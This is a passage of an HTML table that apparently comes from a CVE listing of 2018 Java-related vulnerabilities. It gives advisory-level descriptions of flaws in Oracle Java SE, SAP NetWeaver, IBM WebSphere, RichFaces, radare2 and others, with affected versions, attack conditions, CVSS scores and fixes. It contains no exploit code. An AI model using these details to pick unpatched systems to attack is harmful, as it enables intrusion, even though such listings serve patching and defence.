		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JCE). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.9 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2603">CVE-2018-2603</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2602">CVE-2018-2602</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: I18n). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151. Difficult to exploit vulnerability allows unauthenticated attacker with logon to the infrastructure where Java SE, Java SE Embedded executes to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data as well as unauthorized read access to a subset of Java SE, Java SE Embedded accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 4.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2599">CVE-2018-2599</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JNDI). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded, JRockit accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 4.8 (Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2588">CVE-2018-2588</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: LDAP). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16. Easily exploitable vulnerability allows low privileged attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 4.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2582">CVE-2018-2582</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Hotspot). Supported versions that are affected are Java SE: 8u152 and 9.0.1; Java SE Embedded: 8u151. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 6.5 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2581">CVE-2018-2581</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: JavaFX). Supported versions that are affected are Java SE: 7u161, 8u152 and 9.0.1. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 4.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2579">CVE-2018-2579</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 6u171, 7u161, 8u152 and 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2569">CVE-2018-2569</a></td>
		<td valign="top">Vulnerability in the Java ME SDK component of Oracle Java Micro Edition (subcomponent: Installer). The supported version that is affected is 8.3. Easily exploitable vulnerability allows unauthenticated attacker with logon to the infrastructure where Java ME SDK executes to compromise Java ME SDK. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of Java ME SDK. Note: This applies to the Windows platform only. CVSS 3.0 Base Score 7.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-25084">CVE-2018-25084</a></td>
		<td valign="top">A vulnerability, which was classified as problematic, has been found in Ping Identity Self-Service Account Manager 1.1.2. Affected by this issue is some unknown functionality of the file src/main/java/com/unboundid/webapp/ssam/SSAMController.java. The manipulation leads to cross site scripting. The attack may be launched remotely. Upgrading to version 1.1.3 is able to address this issue. The patch is identified as f64b10d63bb19ca2228b0c2d561a1a6e5a3bf251. It is recommended to upgrade the affected component. VDB-225362 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-25075">CVE-2018-25075</a></td>
		<td valign="top">A vulnerability classified as critical has been found in karsany OBridge up to 1.3. Affected is the function getAllStandaloneProcedureAndFunction of the file obridge-main/src/main/java/org/obridge/dao/ProcedureDao.java. The manipulation leads to sql injection. The complexity of an attack is rather high. The exploitability is told to be difficult. Upgrading to version 1.4 is able to address this issue. The name of the patch is 52eca4ad05f3c292aed3178b2f58977686ffa376. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-218376.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-25068">CVE-2018-25068</a></td>
		<td valign="top">A vulnerability has been found in devent globalpom-utils up to 4.5.0 and classified as critical. This vulnerability affects the function createTmpDir of the file globalpomutils-fileresources/src/main/java/com/anrisoftware/globalpom/fileresourcemanager/FileResourceManagerProvider.java. The manipulation leads to insecure temporary file. The attack can be initiated remotely. Upgrading to version 4.5.1 is able to address this issue. The patch is identified as 77a820bac2f68e662ce261ecb050c643bd7ee560. It is recommended to upgrade the affected component. VDB-217570 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2504">CVE-2018-2504</a></td>
		<td valign="top">SAP NetWeaver AS Java Web Container service does not validate against whitelist the HTTP host header which can result in HTTP Host Header Manipulation or Cross-Site Scripting (XSS) vulnerability. This is fixed in versions 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2503">CVE-2018-2503</a></td>
		<td valign="top">By default, the SAP NetWeaver AS Java keystore service does not sufficiently restrict the access to resources that should be protected. This has been fixed in SAP NetWeaver AS Java (ServerCore versions 7.11, 7.20, 7.30, 7.31, 7.40, 7.50).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2492">CVE-2018-2492</a></td>
		<td valign="top">SAML 2.0 functionality in SAP NetWeaver AS Java, does not sufficiently validate XML documents received from an untrusted source. This is fixed in versions 7.2, 7.30, 7.31, 7.40 and 7.50.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2464">CVE-2018-2464</a></td>
		<td valign="top">SAP WebDynpro Java, versions 7.20, 7.30, 7.31, 7.40, 7.50, does not sufficiently encode user-controlled inputs, resulting in a stored Cross-Site Scripting (XSS) vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2462">CVE-2018-2462</a></td>
		<td valign="top">In certain cases, BEx Web Java Runtime Export Web Service in SAP NetWeaver BI 7.30, 7.31. 7.40, 7.41, 7.50, does not sufficiently validate an XML document accepted from an untrusted source.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2452">CVE-2018-2452</a></td>
		<td valign="top">The logon application of SAP NetWeaver AS Java 7.10 to 7.11, 7.20, 7.30, 7.31, 7.40, 7.50 does not sufficiently encode user-controlled inputs, resulting in a cross-site scripting (XSS) vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2440">CVE-2018-2440</a></td>
		<td valign="top">Under certain circumstances SAP Dynamic Authorization Management (DAM) by NextLabs (Java Policy Controller versions 7.7 and 8.5) exposes sensitive information in the application logs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2424">CVE-2018-2424</a></td>
		<td valign="top">SAP UI5 did not validate user input before adding it to the DOM structure. This may lead to malicious user-provided JavaScript code being added to the DOM that could steal user information. Software components affected are: SAP Hana Database 1.00, 2.00; SAP UI5 1.00; SAP UI5 (Java) 7.30, 7.31, 7.40, 7,50; SAP UI 7.40, 7.50, 7.51, 7.52, and version 2.0 of SAP UI for SAP NetWeaver 7.00

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2415">CVE-2018-2415</a></td>
		<td valign="top">SAP NetWeaver Application Server Java Web Container and HTTP Service (Engine API, from 7.10 to 7.11, 7.30, 7.31, 7.40, 7.50; J2EE Engine Server Core 7.11, 7.30, 7.31, 7.40, 7.50) do not sufficiently encode user controlled inputs, resulting in a content spoofing vulnerability when error pages are displayed.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2371">CVE-2018-2371</a></td>
		<td valign="top">The SAML 2.0 service provider of SAP Netweaver AS Java Web Application, 7.50, does not sufficiently encode user controlled inputs, which results in Cross-Site Scripting (XSS) vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2365">CVE-2018-2365</a></td>
		<td valign="top">SAP NetWeaver Portal, WebDynpro Java, 7.30, 7.31, 7.40, 7.50, does not sufficiently encode user controlled inputs, resulting in Cross-Site Scripting (XSS) vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-20732">CVE-2018-20732</a></td>
		<td valign="top">SAS Web Infrastructure Platform before 9.4M6 allows remote attackers to execute arbitrary code via a Java deserialization variant.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-20580">CVE-2018-20580</a></td>
		<td valign="top">The WSDL import functionality in SmartBear ReadyAPI 2.5.0 and 2.6.0 allows remote attackers to execute arbitrary Java code via a crafted request parameter in a WSDL file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-20318">CVE-2018-20318</a></td>
		<td valign="top">An issue was discovered in weixin-java-tools v3.2.0. There is an XXE vulnerability in the getXmlDoc method of the BaseWxPayResult.java file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1999020">CVE-2018-1999020</a></td>
		<td valign="top">Open Networking Foundation (ONF) ONOS version 1.13.2 and earlier version contains a Directory Traversal vulnerability in core/common/src/main/java/org/onosproject/common/app/ApplicationArchive.java line 35 that can result in arbitrary file deletion (overwrite). This attack appear to be exploitable via a specially crafted zip file should be uploaded.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1904">CVE-2018-1904</a></td>
		<td valign="top">IBM WebSphere Application Server 7.0, 8.0, 8.5, and 9.0 could allow remote attackers to execute arbitrary Java code through an administrative client class with a serialized object from untrusted sources. IBM X-Force ID: 152533.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1890">CVE-2018-1890</a></td>
		<td valign="top">IBM SDK, Java Technology Edition Version 8 on the AIX platform uses absolute RPATHs which may facilitate code injection and privilege elevation by local users. IBM X-Force ID: 152081.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-18013">CVE-2018-18013</a></td>
		<td valign="top">** DISPUTED *** Xen Mobile through 10.8.0 includes a service listening on port 5001 within its firewall that accepts unauthenticated input. If this service is supplied with raw serialised Java objects, it deserialises them back into Java objects in memory, giving rise to a remote code execution vulnerability.  NOTE: the vendor disputes that this is a vulnerability, stating it is "already mitigated by the internal firewall that limits access to configuration services to localhost."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1755">CVE-2018-1755</a></td>
		<td valign="top">IBM WebSphere Application Server Liberty could allow a remote attacker to obtain sensitive information, caused by incorrect transport being used when Liberty is configured to use Java Authentication SPI for Containers (JASPIC). This can happen when the Application Server is configured to permit access on non-secure (http) port and using JASPIC or JSR375 authentication.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-17247">CVE-2018-17247</a></td>
		<td valign="top">Elasticsearch Security versions 6.5.0 and 6.5.1 contain an XXE flaw in Machine Learning's find_file_structure API. If a policy allowing external network access has been added to Elasticsearch's Java Security Manager then an attacker could send a specially crafted request capable of leaking content of local files on the Elasticsearch node. This could allow a user to access information that they should not have access to.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-17198">CVE-2018-17198</a></td>
		<td valign="top">Server-side Request Forgery (SSRF) and File Enumeration vulnerability in Apache Roller 5.2.1, 5.2.0 and earlier unsupported versions relies on Java SAX Parser to implement its XML-RPC interface and by default that parser supports external entities in XML DOCTYPE, which opens Roller up to SSRF / File Enumeration vulnerability. Note that this vulnerability exists even if Roller XML-RPC interface is disable via the Roller web admin UI. Mitigation: There are a couple of ways you can fix this vulnerability: 1) Upgrade to the latest version of Roller, which is now 5.2.2 2) Or, edit the Roller web.xml file and comment out the XML-RPC Servlet mapping as shown below: &lt;!-- &lt;servlet-mapping&gt; &lt;servlet-name&gt;XmlRpcServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/roller-services/xmlrpc&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; --&gt;

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-16621">CVE-2018-16621</a></td>
		<td valign="top">Sonatype Nexus Repository Manager before 3.14 allows Java Expression Language Injection.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1656">CVE-2018-1656</a></td>
		<td valign="top">The IBM Java Runtime Environment's Diagnostic Tooling Framework for Java (DTFJ) (IBM SDK, Java Technology Edition 6.0 , 7.0, and 8.0) does not protect against path traversal attacks when extracting compressed dump files. IBM X-Force ID: 144882.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-16386">CVE-2018-16386</a></td>
		<td valign="top">An issue was discovered in SWIFT Alliance Web Platform 7.1.23. A log injection (and an arbitrary log filename) can be achieved via the PATH_INFO to swp/login/EJBRemoteService/, related to com.swift.ejbgwt.j2ee.client.EjBlnvocationException error log information containing null@java:comp/env/ error messages.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-16171">CVE-2018-16171</a></td>
		<td valign="top">Directory traversal vulnerability in Cybozu Remote Service 3.0.0 to 3.1.8 allows remote attackers to execute Java code file on the server via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-16169">CVE-2018-16169</a></td>
		<td valign="top">Cybozu Remote Service 3.0.0 to 3.1.0 allows remote authenticated attackers to upload and execute Java code file on the server via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1567">CVE-2018-1567</a></td>
		<td valign="top">IBM WebSphere Application Server 7.0, 8.0, 8.5, and 9.0 could allow remote attackers to execute arbitrary Java code through the SOAP connector with a serialized object from untrusted sources. IBM X-Force ID: 143024.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-15528">CVE-2018-15528</a></td>
		<td valign="top">Reflected Cross-Site Scripting exists in the Java System Solutions SSO plugin 4.0.13.1 for BMC MyIT. A remote attacker can abuse this issue to inject client-side scripts into the "select_sso()" function. The payload is triggered when the victim opens a prepared /ux/jss-sso/arslogin?[XSS] link and then clicks the "Login" button.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-15381">CVE-2018-15381</a></td>
		<td valign="top">A Java deserialization vulnerability in Cisco Unity Express (CUE) could allow an unauthenticated, remote attacker to execute arbitrary shell commands with the privileges of the root user. The vulnerability is due to insecure deserialization of user-supplied content by the affected software. An attacker could exploit this vulnerability by sending a malicious serialized Java object to the listening Java Remote Method Invocation (RMI) service. A successful exploit could allow the attacker to execute arbitrary commands on the device with root privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1517">CVE-2018-1517</a></td>
		<td valign="top">A flaw in the java.math component in IBM SDK, Java Technology Edition 6.0, 7.0, and 8.0 may allow an attacker to inflict a denial-of-service attack with specially crafted String data. IBM X-Force ID: 141681.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-14925">CVE-2018-14925</a></td>
		<td valign="top">Matera Banco 1.0.0 mishandles Java errors in the backend, as demonstrated by a stack trace revealing use of net.sf.acegisecurity components.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-14667">CVE-2018-14667</a></td>
		<td valign="top">The RichFaces Framework 3.X through 3.3.4 is vulnerable to Expression Language (EL) injection via the UserResource resource. A remote, unauthenticated attacker could exploit this to execute arbitrary code using a chain of java serialized objects via org.ajax4jsf.resource.UserResource$UriData.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-14371">CVE-2018-14371</a></td>
		<td valign="top">The getLocalePrefix function in ResourceManager.java in Eclipse Mojarra before 2.3.7 is affected by Directory Traversal via the loc parameter. A remote attacker can download configuration files or Java bytecodes from applications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1417">CVE-2018-1417</a></td>
		<td valign="top">Under certain circumstances, a flaw in the J9 JVM (IBM SDK, Java Technology Edition 7.1 and 8.0) allows untrusted code running under a security manager to elevate its privileges. IBM X-Force ID: 138823.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-14017">CVE-2018-14017</a></td>
		<td valign="top">The r_bin_java_annotation_new function in shlr/java/class.c in radare2 2.7.0 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) via a crafted .class file because of missing input validation in r_bin_java_line_number_table_attr_new.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-13439">CVE-2018-13439</a></td>
		<td valign="top">WXPayUtil in WeChat Pay Java SDK allows XXE attacks involving a merchant notification URL.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1320">CVE-2018-1320</a></td>
		<td valign="top">Apache Thrift Java client library versions 0.5.0 through 0.11.0 can bypass SASL negotiation isComplete validation in the org.apache.thrift.transport.TSaslTransport class. An assert used to determine if the SASL handshake had successfully completed could be disabled in production settings making the validation incomplete.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1313">CVE-2018-1313</a></td>
		<td valign="top">In Apache Derby 10.3.1.4 to 10.14.1.0, a specially-crafted network packet can be used to request the Derby Network Server to boot a database whose location and contents are under the user's control. If the Derby Network Server is not running with a Java Security Manager policy file, the attack is successful. If the server is using a policy file, the policy file must permit the database location to be read for the attack to work. The default Derby Network Server policy file distributed with the affected releases includes a permissive policy as the default Network Server policy, which allows the attack to work.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-12585">CVE-2018-12585</a></td>
		<td valign="top">An XXE vulnerability in the OPC UA Java and .NET Legacy Stack can allow remote attackers to trigger a denial of service.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-12539">CVE-2018-12539</a></td>
		<td valign="top">In Eclipse OpenJ9 version 0.8, users other than the process owner may be able to use Java Attach API to connect to an Eclipse OpenJ9 or IBM JVM on the same machine and use Attach API operations, which includes the ability to execute untrusted native code. Attach API is enabled by default on Windows, Linux and AIX JVMs and can be disabled using the command line option -Dcom.ibm.tools.attach.enable=no.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-12533">CVE-2018-12533</a></td>
		<td valign="top">JBoss RichFaces 3.1.0 through 3.3.4 allows unauthenticated remote attackers to inject expression language (EL) expressions and execute arbitrary Java code via a /DATA/ substring in a path with an org.richfaces.renderkit.html.Paint2DResource$ImageData object, aka RF-14310.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-12532">CVE-2018-12532</a></td>
		<td valign="top">JBoss RichFaces 4.5.3 through 4.5.17 allows unauthenticated remote attackers to inject an arbitrary expression language (EL) variable mapper and execute arbitrary Java code via a MediaOutputResource's resource request, aka RF-14309.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1245">CVE-2018-1245</a></td>
		<td valign="top">RSA Identity Lifecycle and Governance versions 7.0.1, 7.0.2 and 7.1.0 contains an authorization bypass vulnerability within the workflow architect component (ACM). A remote authenticated malicious user with non-admin privileges could potentially bypass the Java Security Policies. Once bypassed, a malicious user could potentially run arbitrary system commands at the OS level with application owner privileges on the affected system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-12321">CVE-2018-12321</a></td>
		<td valign="top">There is a heap out of bounds read in radare2 2.6.0 in java_switch_op() in libr/anal/p/anal_java.c via a crafted Java binary file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-12320">CVE-2018-12320</a></td>
		<td valign="top">There is a use after free in radare2 2.6.0 in r_anal_bb_free() in libr/anal/bb.c via a crafted Java binary file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-11779">CVE-2018-11779</a></td>
		<td valign="top">In Apache Storm versions 1.1.0 to 1.2.2, when the user is using the storm-kafka-client or storm-kafka modules, it is possible to cause the Storm UI daemon to deserialize user provided bytes into a Java class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-11775">CVE-2018-11775</a></td>
		<td valign="top">TLS hostname verification when using the Apache ActiveMQ Client before 5.15.6 was missing which could make the client vulnerable to a MITM attack between a Java application using the ActiveMQ client and the ActiveMQ server. This is now enabled by default.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-11076">CVE-2018-11076</a></td>
		<td valign="top">Dell EMC Avamar Server versions 7.2.0, 7.2.1, 7.3.0, 7.3.1, 7.4.0 and 7.4.1 and Dell EMC Integrated Data Protection Appliance (IDPA) 2.0 are affected by an information exposure vulnerability. Avamar Java management console's SSL/TLS private key may be leaked in the Avamar Java management client package. The private key could potentially be used by an unauthenticated attacker on the same data-link layer to initiate a MITM attack on management console users.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-10654">CVE-2018-10654</a></td>
		<td valign="top">There is a Hazelcast Library Java Deserialization Vulnerability in Citrix XenMobile Server 10.8 before RP2 and 10.7 before RP3.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-10611">CVE-2018-10611</a></td>
		<td valign="top">Java remote method invocation (RMI) input port in GE MDS PulseNET and MDS PulseNET Enterprise version 3.2.1 and prior may be exploited to allow unauthenticated users to launch applications and support remote code execution through web services.

</td>
	</tr>
	<tr>
